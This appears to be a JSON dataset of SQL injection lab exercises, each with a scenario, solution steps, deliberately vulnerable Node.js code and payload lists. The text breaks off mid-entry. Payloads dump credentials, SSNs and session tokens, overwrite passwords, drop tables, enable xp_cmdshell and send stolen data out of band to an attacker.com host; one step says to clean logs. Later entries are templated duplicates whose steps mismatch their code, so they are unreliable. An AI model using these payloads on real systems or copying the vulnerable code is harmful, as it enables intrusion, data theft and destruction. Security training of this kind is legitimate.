[
  {
    "Lab scenario": "E-commerce API SQL injection in ORDER BY clause",
    "Lab Description": "The product listing API endpoint is vulnerable to SQL injection in the 'sort' parameter which controls ORDER BY. The application directly concatenates user input into the query without sanitization. To solve: bypass WAF filters to extract admin credentials from the users table using a time-based technique.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send GET requests to /api/products?sort=price",
      "Identify WAF blacklist patterns by testing common SQL keywords",
      "Bypass filters using whitespace variations: '/*!50000SELECT*/'",
      "Confirm time delay with: sort=(CASE WHEN (1=1) THEN SLEEP(5) ELSE price END)",
      "Extract password character-by-character using: sort=(CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN SLEEP(5) ELSE price END)"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'api_user',\n  password: 'securepass',\n  database: 'ecommerce'\n});\n\napp.get('/api/products', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id, name, price FROM products ORDER BY ${sort} LIMIT 10`;\n  \n  console.log(`Executing: ${query}`);\n  \n  db.query(query, (err, results) => {\n    if (err) {\n      console.error(err);\n      return res.status(500).json({error: 'Database error'});\n    }\n    res.json(results);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "sort=(CASE WHEN (1=1) THEN SLEEP(5) ELSE id END)",
      "sort=(SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))-- -",
      "sort=price ASC,(SELECT 1 FROM DUAL WHERE SLEEP(5))-- -",
      "sort=1,(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' THEN SLEEP(5) ELSE 1 END))-- -"
    ]
  },
  {
    "Lab scenario": "Healthcare portal SQL injection in HAVING clause",
    "Lab Description": "The patient search feature builds dynamic HAVING conditions vulnerable to injection. The application uses parameterized queries for WHERE but concatenates HAVING directly. To solve: exploit this uncommon injection point to dump the entire patient database including SSNs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept search request with Burp Suite",
      "Identify HAVING clause injection via error messages",
      "Use OWASP ZAP fuzzer to test UNION payloads",
      "Determine column count with HAVING 1=1 UNION SELECT 1,2,3,4,5--",
      "Extract data with: HAVING 1=1 UNION SELECT id,ssn,name,null,null FROM patients--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('pg');\nconst app = express();\n\nconst pool = new Pool({/* config */});\n\napp.post('/search', async (req, res) => {\n  const { name, minAge } = req.body;\n  \n  // Vulnerable HAVING construction\n  let having = '';\n  if (req.body.conditions) {\n    having = `HAVING ${req.body.conditions}`;\n  }\n  \n  const query = {\n    text: `SELECT id, name, age FROM patients \n           WHERE name LIKE $1 AND age > $2 \n           ${having}`,\n    values: [name, minAge]\n  };\n  \n  try {\n    const result = await pool.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    console.error(err.stack);\n    res.status(500).send(err.message); // Error leakage\n  }\n});",
    "payloads": [
      "1=1 UNION SELECT 1,2,3,4,5--",
      "1=1 UNION SELECT id,ssn,name,null,null FROM patients--",
      "1=1; COPY (SELECT * FROM patients) TO '/var/www/static/leak.csv'--",
      "1=1 AND (SELECT COUNT(*) FROM patients) > 100--"
    ]
  },
  {
    "Lab scenario": "IoT dashboard blind SQLi in device status filter",
    "Lab Description": "The device management dashboard uses blind SQL injection in the status filter parameter. No direct results are shown but the page length changes when conditions are true. To solve: use boolean-based inference to extract the admin API key from the configuration table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture normal status filter request with Burp",
      "Test boolean conditions: status=1' AND 1=1-- vs status=1' AND 1=2--",
      "Use sqlmap with --string=\"<table\" to detect content differences",
      "Manual exploitation with: status=1' AND (SELECT SUBSTR(api_key,1,1) FROM config)='a'--",
      "Automate with Burp Intruder cluster bomb attack"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\n\napp.get('/devices', (req, res) => {\n  const db = new sqlite3.Database('iot.db');\n  const status = req.query.status || '1';\n  \n  const query = `SELECT id, name FROM devices WHERE status = ${status}`;\n  \n  db.all(query, [], (err, rows) => {\n    db.close();\n    \n    if (err) {\n      return res.status(500).send('Error');\n    }\n    \n    // Vulnerable - different response length based on data\n    if (rows.length > 0) {\n      res.send(generateLargeTable(rows));\n    } else {\n      res.send(generateEmptyTable());\n    }\n  });\n});",
    "payloads": [
      "1' AND 1=1--",
      "1' AND (SELECT COUNT(*) FROM sqlite_master) > 0--",
      "1' AND (SELECT SUBSTR(api_key,1,1) FROM config)='a'--",
      "1' AND (SELECT HEX(SUBSTR(api_key,1,1)) FROM config)=HEX('a')--"
    ]
  },
  {
    "Lab scenario": "CMS UNION injection with JSON response",
    "Lab Description": "The article search feature in a headless CMS is vulnerable to UNION SQL injection returning JSON. The application uses numeric IDs but string concatenation. To solve: modify the Content-Type header to bypass WAF and extract all user emails.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept POST /api/search with Burp",
      "Change Content-Type to application/xml to bypass WAF",
      "Find column count with ORDER BY",
      "Identify string columns with UNION SELECT 'a','b','c'",
      "Extract data with: UNION SELECT null,email,password FROM users--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.json());\n\napp.post('/api/search', (req, res) => {\n  const db = require('./db');\n  const { id } = req.body;\n  \n  // Vulnerable - no input validation\n  const query = `SELECT id, title, content FROM articles WHERE id = ${id}`;\n  \n  db.query(query, (err, results) => {\n    if (err) {\n      return res.status(500).json({ error: true });\n    }\n    \n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT null,email,password FROM users--",
      "1 UNION SELECT null,@@version,database()--",
      "1 UNION ALL SELECT table_name,column_name,null FROM information_schema.columns--",
      "999 OR 1=1 UNION SELECT 1,2,3,4 FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking portal second-order SQLi in password reset",
    "Lab Description": "The password reset feature stores unsanitized input that gets used in subsequent SQL queries. The application appears secure during initial input but vulnerable when processing the token. To solve: exploit this second-order injection to bypass authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Request password reset for target account",
      "In reset token field use: ' OR '1'='1'--",
      "Intercept token processing with Burp",
      "Observe the token gets used in raw SQL",
      "Login as admin without valid token"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// First vulnerable step - stores unsanitized\napp.post('/reset', (req, res) => {\n  const email = req.body.email;\n  const token = req.body.token || generateToken();\n  \n  db.query(`INSERT INTO resets (email, token) VALUES ('${email}', '${token}')`);\n  res.send('Check your email');\n});\n\n// Second vulnerable step - uses stored value\napp.post('/reset-confirm', (req, res) => {\n  const token = req.body.token;\n  \n  // Direct usage in query\n  db.query(`SELECT email FROM resets WHERE token = '${token}'`, (err, result) => {\n    if (result.rows.length) {\n      // Allow password change\n    }\n  });\n});",
    "payloads": [
      "' OR '1'='1'--",
      "' UNION SELECT 'admin@bank.com' FROM users--",
      "'; UPDATE users SET password='hacked' WHERE username='admin'--",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
    ]
  },
  {
    "Lab scenario": "GraphQL SQL injection via inline fragments",
    "Lab Description": "The GraphQL endpoint converts arguments directly to SQL without sanitization. The application uses a custom @sql directive that bypasses security controls. To solve: craft a GraphQL query with SQLi in the filter argument to extract schema information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inspect GraphQL schema in Burp for @sql directives",
      "Send introspection query to find vulnerable fields",
      "Craft query with malicious filter: { products(filter: \"1=1 UNION SELECT 1,table_name FROM information_schema.tables\") }",
      "Use GraphQL variables to bypass simple filters",
      "Extract sensitive columns via field aliasing"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const { ApolloServer } = require('apollo-server');\nconst typeDefs = `\n  directive @sql(raw: Boolean) on FIELD_DEFINITION\n  \n  type Product {\n    id: ID!\n    name: String!\n  }\n  \n  type Query {\n    products(filter: String): [Product] @sql(raw: true)\n  }\n`;\n\nconst resolvers = {\n  Query: {\n    products: (_, { filter }) => {\n      const where = filter ? `WHERE ${filter}` : '';\n      return db.query(`SELECT * FROM products ${where}`);\n    }\n  }\n};\n\nnew ApolloServer({ typeDefs, resolvers }).listen();",
    "payloads": [
      "{ products(filter: \"1=1 UNION SELECT 1,table_name FROM information_schema.tables\") { id name } }",
      "query($filter: String!) { products(filter: $filter) { id } }",
      "{ products(filter: \"name LIKE '%' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--\") { id } }",
      "mutation { __schema { types { name fields { name } } } }"
    ]
  },
  {
    "Lab scenario": "SOAP API SQLi via XML entity injection",
    "Lab Description": "The legacy SOAP service processes XML requests by directly embedding values in SQL queries. The application fails to properly handle XML entities. To solve: combine XXE with SQL injection to extract data via out-of-band techniques.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture SOAP request with Burp",
      "Inject XML entities: <id>&xxe;</id>",
      "Define malicious entity: <!ENTITY xxe \"' OR 1=1--\">",
      "Set up DNS listener for OOB data exfiltration",
      "Use payload: '; DECLARE @q varchar(1024); SET @q = (SELECT password FROM users); EXEC('master..xp_dirtree \"\\\\'+@q+'.attacker.com\\c$\"')--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser-xml');\nconst app = express();\n\nbodyParser.xml(app);\n\napp.post('/soap', (req, res) => {\n  const xml = req.body;\n  const id = xml['soap:Envelope']['soap:Body'][0].GetProduct[0].id[0];\n  \n  // Vulnerable processing\n  const query = `SELECT * FROM products WHERE id = '${id}'`;\n  \n  db.query(query, (err, results) => {\n    // Return SOAP response\n  });\n});",
    "payloads": [
      "<!DOCTYPE test [ <!ENTITY xxe \"' OR 1=1--\"> ]>",
      "<id>' UNION SELECT 1,2,3,LOAD_FILE('/etc/passwd')--</id>",
      "<id>'; EXEC xp_cmdshell('nslookup exfil.attacker.com')--</id>",
      "<id>'||UTL_HTTP.request('attacker.com/'||(SELECT password FROM users WHERE username='admin'))--</id>"
    ]
  },
  {
    "Lab scenario": "Admin panel SQLi in GROUP BY parameter",
    "Lab Description": "The analytics dashboard builds dynamic GROUP BY clauses from user input. The application properly parameterizes WHERE but not GROUP BY. To solve: exploit this to perform a UNION attack retrieving the admin session tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as low-priv user and access analytics",
      "Intercept group parameter with Burp",
      "Test with: group=1 UNION SELECT 1,2,3,4",
      "Determine string columns with: group=1 UNION SELECT 'a','b','c','d'",
      "Extract tokens with: group=1 UNION SELECT 1,session_token,3,4 FROM admin_sessions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\nconst { Pool } = require('pg');\n\nconst pool = new Pool({/* config */});\n\napp.get('/analytics', async (req, res) => {\n  const group = req.query.group || 'day';\n  \n  // Vulnerable GROUP BY\n  const query = `\n    SELECT COUNT(*), ${group} \n    FROM page_views \n    WHERE user_id = $1 \n    GROUP BY ${group}`;\n  \n  try {\n    const result = await pool.query(query, [req.user.id]);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).send(err.message); // Error leakage\n  }\n});",
    "payloads": [
      "1 UNION SELECT 1,2,3,4",
      "1 UNION SELECT session_token,null,null,null FROM admin_sessions",
      "1; INSERT INTO admin_sessions VALUES ('hacker','stolen_token')--",
      "1 UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns"
    ]
  },
  {
    "Lab scenario": "Mobile API SQLi via JSON array exploitation",
    "Lab Description": "The mobile API accepts JSON arrays that get expanded directly into IN() clauses. The application fails to properly sanitize array values. To solve: break out of the IN clause to perform a stacked query attack updating all user passwords.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture mobile app API call with Burp",
      "Modify JSON array to: [\"1\") OR 1=1; UPDATE users SET password='hacked'--\"]",
      "Bypass WAF by encoding as Unicode: [\"\\u0031\\u0022\\u0029\\u0020\\u004f\\u0052\\u0020\\u0031\\u003d\\u0031\\u003b\\u0020\\u0055\\u0050\\u0044\\u0041\\u0054\\u0045\"]",
      "Verify password change by logging in as any user",
      "Clean logs with additional stacked query"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.json());\n\napp.post('/api/products', (req, res) => {\n  const ids = req.body.ids; // Expects array like [1,2,3]\n  \n  // Vulnerable IN() construction\n  const query = `SELECT * FROM products WHERE id IN (${ids.map(id => `'${id}'`).join(',')})`;\n  \n  db.query(query, (err, results) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(results);\n  });\n});",
    "payloads": [
      "[\"1\") OR 1=1--\"]",
      "[\"1\"); DROP TABLE logs--\"]",
      "[\"1\" UNION SELECT password FROM users--\"]",
      "[\"1' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--\"]"
    ]
  },
  {
    "Lab scenario": "Multi-step SQLi in e-commerce checkout",
    "Lab Description": "The checkout process has multiple SQL injections across different steps. The application uses temporary tables with unsanitized data. To solve: chain these injections to poison the session table and gain admin access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Add item to cart with XSS payload in product name",
      "Proceed to checkout and intercept address update",
      "Inject into address field: '; UPDATE temp_cart SET user_id=1--",
      "Complete payment to trigger temp table processing",
      "Session becomes admin due to poisoned user_id"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/checkout/address', (req, res) => {\n  const { address } = req.body;\n  \n  // First injection\n  db.query(`UPDATE temp_cart SET address = '${address}' WHERE session = '${req.session.id}'`);\n  \n  res.redirect('/checkout/payment');\n});\n\napp.post('/checkout/complete', (req, res) => {\n  // Second injection when processing\n  db.query(`\n    INSERT INTO orders \n    SELECT * FROM temp_cart \n    WHERE session = '${req.session.id}'`);\n  \n  // Vulnerable session update\n  db.query(`\n    UPDATE sessions \n    SET user_id = (SELECT user_id FROM temp_cart WHERE session = '${req.session.id}') \n    WHERE id = '${req.session.id}'`);\n});",
    "payloads": [
      "'; UPDATE temp_cart SET user_id=1--",
      "1'; INSERT INTO temp_cart (session,user_id) VALUES ('hijacked',1)--",
      "'||(SELECT password FROM users WHERE username='admin')||'",
      "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"
    ]
  },
  {
    "Lab scenario": "Banking portal Boolean-based SQL injection in ORDER BY clause",
    "Lab Description": "The application contains a Boolean-based SQL injection vulnerability in the ORDER BY clause, allowing attackers to manipulate SQL queries. The user input is not properly sanitized, allowing crafted queries to bypass controls. To solve: perform a successful injection and extract sensitive information based on the exploitation path.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR '1'='1 -- ",
      "' UNION SELECT null, sqlite_version(), null -- ",
      "' AND 1=IF(1=1,SLEEP(5),0) -- ",
      "' OR EXISTS(SELECT * FROM users WHERE role='admin') -- ",
      "'; EXEC xp_cmdshell('whoami'); --"
    ]
  },
  {
    "Lab scenario": "Time-based SQL injection scenario",
    "Lab Description": "This lab explores a time-based sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 2",
      "' UNION SELECT null, version(), null -- 2",
      "' AND SLEEP(2) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=2) -- ",
      "admin' -- 2"
    ]
  },
  {
    "Lab scenario": "Error-based SQL injection scenario",
    "Lab Description": "This lab explores a error-based sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 3",
      "' UNION SELECT null, version(), null -- 3",
      "' AND SLEEP(3) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=3) -- ",
      "admin' -- 3"
    ]
  },
  {
    "Lab scenario": "Union-based SQL injection scenario",
    "Lab Description": "This lab explores a union-based sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 4",
      "' UNION SELECT null, version(), null -- 4",
      "' AND SLEEP(4) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=4) -- ",
      "admin' -- 4"
    ]
  },
  {
    "Lab scenario": "Blind SQL SQL injection scenario",
    "Lab Description": "This lab explores a blind sql sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 5",
      "' UNION SELECT null, version(), null -- 5",
      "' AND SLEEP(5) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=5) -- ",
      "admin' -- 5"
    ]
  },
  {
    "Lab scenario": "Out-of-band SQL injection scenario",
    "Lab Description": "This lab explores a out-of-band sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 6",
      "' UNION SELECT null, version(), null -- 6",
      "' AND SLEEP(6) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=6) -- ",
      "admin' -- 6"
    ]
  },
  {
    "Lab scenario": "Login Bypass SQL injection scenario",
    "Lab Description": "This lab explores a login bypass sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 7",
      "' UNION SELECT null, version(), null -- 7",
      "' AND SLEEP(7) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=7) -- ",
      "admin' -- 7"
    ]
  },
  {
    "Lab scenario": "Update Injection SQL injection scenario",
    "Lab Description": "This lab explores a update injection sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 8",
      "' UNION SELECT null, version(), null -- 8",
      "' AND SLEEP(8) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=8) -- ",
      "admin' -- 8"
    ]
  },
  {
    "Lab scenario": " Delete Injection SQL injection scenario",
    "Lab Description": "This lab explores a delete injection sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
